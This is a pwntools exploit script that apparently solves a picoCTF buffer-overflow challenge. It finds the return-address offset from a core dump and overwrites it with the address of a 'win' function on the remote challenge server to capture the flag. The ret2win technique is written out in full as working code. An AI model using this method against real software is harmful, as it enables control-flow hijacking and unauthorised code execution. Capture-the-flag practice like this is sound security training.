import pwn
import subprocess
from typing import cast
import re

HOST = "saturn.picoctf.net"
PORT = 50384

subprocess.run(["ulimit", "-c", "unlimited"], shell=True)
elf: pwn.ELF = pwn.ELF("./vuln")

payload = cast(bytes, pwn.cyclic(100))
ioLocal = cast(pwn.process, elf.process())

ioLocal.sendline(payload)
ioLocal.wait()
fault = ioLocal.corefile.fault_addr
offset = pwn.cyclic_find(fault & 0xFFFFFFFF)

payload = pwn.cyclic(offset) + pwn.p32(elf.symbols["win"])
p: pwn.remote = pwn.remote(HOST, PORT)

p.sendline(payload)
out = p.recvall().decode()

match = re.search(r"picoCTF\{.*?\}", out)

if match:
    subprocess.run("clear")
    print(match.group(0))
